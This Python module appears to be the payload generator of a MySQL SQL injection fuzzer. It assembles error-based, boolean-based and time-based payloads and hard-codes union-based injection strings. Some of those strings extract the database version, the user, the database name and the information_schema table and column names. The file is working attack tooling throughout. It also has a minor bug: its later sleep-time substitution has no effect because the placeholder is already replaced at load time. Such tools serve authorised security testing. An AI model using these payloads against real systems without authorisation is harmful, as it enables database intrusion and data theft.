#!/usr/bin/env python3
"""
Payload Generator module for the SQL Injection Fuzzer
"""
import random
from modules.payloads import PAYLOADS


class PayloadGenerator:
    def __init__(self):
        self.error_based_payloads = []
        self.boolean_based_payloads = []
        self.time_based_payloads = []
        self.union_based_payloads = []

        # Initialize payloads from the payloads.py file
        self._load_payloads_from_file()

        # Also keep some classic union-based payloads
        self._init_union_payloads()

    def _load_payloads_from_file(self):
        """Load payloads from the payloads.py file"""
        # Process boolean-based payloads
        for payload_obj in PAYLOADS.get("MySQL", {}).get("boolean-based", []):
            base_payload = payload_obj.get("payload", "")
            comments = payload_obj.get("comments", [])

            for comment in comments:
                pref = comment.get("pref", "")
                suf = comment.get("suf", "")
                full_payload = f"{pref}{base_payload}{suf}"
                self.boolean_based_payloads.append(full_payload)

        # Process time-based payloads
        for payload_obj in PAYLOADS.get("MySQL", {}).get("time-based", []):
            base_payload = payload_obj.get(
                "payload", "").replace("[SLEEPTIME]", "5")
            comments = payload_obj.get("comments", [])

            for comment in comments:
                pref = comment.get("pref", "")
                suf = comment.get("suf", "")
                full_payload = f"{pref}{base_payload}{suf}"
                self.time_based_payloads.append(full_payload)

        # Process error-based payloads
        for payload_obj in PAYLOADS.get("MySQL", {}).get("error-based", []):
            base_payload = payload_obj.get("payload", "")
            comments = payload_obj.get("comments", [])

            for comment in comments:
                pref = comment.get("pref", "")
                suf = comment.get("suf", "")
                full_payload = f"{pref}{base_payload}{suf}"
                self.error_based_payloads.append(full_payload)

    def _init_union_payloads(self):
        """Initialize union-based payloads"""
        self.union_based_payloads = [
            "' UNION SELECT NULL -- ",
            "' UNION SELECT NULL,NULL -- ",
            "' UNION SELECT NULL,NULL,NULL -- ",
            "' UNION SELECT NULL,NULL,NULL,NULL -- ",
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL -- ",
            "' UNION SELECT @@version -- ",
            "' UNION SELECT user(),database() -- ",
            "' UNION SELECT table_name,column_name FROM information_schema.columns -- ",
            "' UNION SELECT 1,2,3,4,5,6,7,8,9,10 -- "
        ]

    def generate_mysql_payloads(self, max_payloads=None):
        """
        Generate a list of MySQL-specific SQL injection payloads

        Args:
            max_payloads (int, optional): Maximum number of payloads to return

        Returns:
            list: A list of SQL injection payloads
        """
        all_payloads = []

        # Combine all payload types
        all_payloads.extend(self.error_based_payloads)
        all_payloads.extend(self.boolean_based_payloads)
        all_payloads.extend(self.time_based_payloads)
        all_payloads.extend(self.union_based_payloads)

        # Remove duplicates while preserving order
        unique_payloads = []
        for payload in all_payloads:
            if payload not in unique_payloads:
                unique_payloads.append(payload)

        # Limit the number of payloads if specified
        if max_payloads and max_payloads < len(unique_payloads):
            # Ensure we have a good mix of different payload types
            error_count = min(max_payloads // 4,
                              len(self.error_based_payloads))
            boolean_count = min(max_payloads // 4,
                                len(self.boolean_based_payloads))
            time_count = min(max_payloads // 4, len(self.time_based_payloads))
            union_count = max_payloads - error_count - boolean_count - time_count

            selected_payloads = []
            selected_payloads.extend(random.sample(
                self.error_based_payloads, error_count))
            selected_payloads.extend(random.sample(
                self.boolean_based_payloads, boolean_count))
            selected_payloads.extend(random.sample(
                self.time_based_payloads, time_count))
            selected_payloads.extend(random.sample(self.union_based_payloads, min(
                union_count, len(self.union_based_payloads))))

            return selected_payloads

        return unique_payloads

    def generate_custom_payloads(self, payload_template, values):
        """
        Generate custom payloads by substituting values into a template

        Args:
            payload_template (str): Template with placeholders
            values (list): List of values to substitute

        Returns:
            list: A list of customized payloads
        """
        custom_payloads = []

        for value in values:
            custom_payload = payload_template.replace("{}", str(value))
            custom_payloads.append(custom_payload)

        return custom_payloads

    def generate_error_based_payloads(self):
        """Get error-based payloads"""
        return self.error_based_payloads

    def generate_boolean_based_payloads(self):
        """Get boolean-based payloads"""
        return self.boolean_based_payloads

    def generate_time_based_payloads(self):
        """
        Get time-based payloads with default sleep time

        Returns:
            list: Time-based payloads
        """
        # Use fixed sleep time of 3 seconds for time-based payloads
        sleep_time = 3
        return [p.replace("[SLEEPTIME]", str(sleep_time)) for p in self.time_based_payloads]

    def generate_union_based_payloads(self):
        """Get union-based payloads"""
        return self.union_based_payloads
